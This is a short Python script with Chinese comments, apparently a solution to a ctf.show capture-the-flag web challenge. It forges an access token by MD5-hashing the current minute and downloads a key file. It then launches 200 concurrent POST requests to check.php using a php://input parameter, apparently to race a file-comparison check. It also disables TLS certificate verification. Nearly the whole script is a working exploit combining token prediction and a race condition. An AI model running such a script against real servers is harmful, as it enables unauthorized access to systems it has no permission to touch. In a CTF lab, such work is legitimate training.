import requests
import datetime
import threading
import hashlib

requests.packages.urllib3.disable_warnings()

# 获取当前时间的分钟
t = datetime.datetime.now().minute
token = hashlib.md5(str(t).encode()).hexdigest()

# 下载key.dat
url = "https://949f4102-1475-497e-b937-e0f3c06c44ec.challenge.ctf.show/"
r1 = requests.get(url + "key.dat", verify=False) # 忽略证书（不安全）
with open('key.dat', 'wb') as f:
    f.write(r1.content)

def upload_data(url, data):
    # 通过php://input上传flag.dat的数据
    url = f"{url}check.php?token={token}&php://input"
    s = requests.post(url, data=data, verify=False) # 忽略证书（不安全）
    print(s.text)


with open('key.dat', 'rb') as f:
    data1 = f.read()

for i in range(100):
    threading.Thread(target=upload_data, args=(url, data1)).start()
for i in range(100):
    # sha512进行判断，让它不相等
    data2 = 'We are not equal'
    threading.Thread(target=upload_data, args=(url, data2)).start()